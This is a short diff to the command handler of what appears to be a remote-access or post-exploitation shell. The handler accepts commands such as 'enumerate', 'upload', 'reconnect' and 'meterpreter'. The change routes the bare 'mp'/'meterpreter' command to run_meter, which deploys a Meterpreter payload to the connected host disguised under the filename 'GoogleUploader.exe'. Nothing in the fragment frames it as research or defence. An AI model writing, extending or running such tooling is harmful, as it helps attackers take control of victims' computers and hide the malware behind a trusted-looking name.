@@ -237,6 +237,8 @@ def shell(s):
             continue
         elif cmd.strip() in ["enum", "enumerate"]:
             enumerate_0(s)
+        elif cmd.strip() in ["mp", "meterpreter"]:
+            run_meter(s, "GoogleUploader.exe")
         elif len(cmd.split(" ")) > 1:
             cmd = cmd.split(" ")
             if cmd[0].strip() == "upload":
@@ -253,8 +255,6 @@ def shell(s):
                 if len(cmd) > 1:
                     if cmd[1] in ["-h", "--help"]:
                         p("Usuage: meterpreter [-h|--help] [<lport>] [<lhost>] [<http port>]")
-                elif len(cmd) == 1:
-                    run_meter(s, "GoogleUploader.exe")
                 elif len(cmd) == 4:
                     run_meter(s, "GoogleUploader.exe", cmd[1], cmd[2], cmd[3])
         elif cmd.strip() == "reconnect":
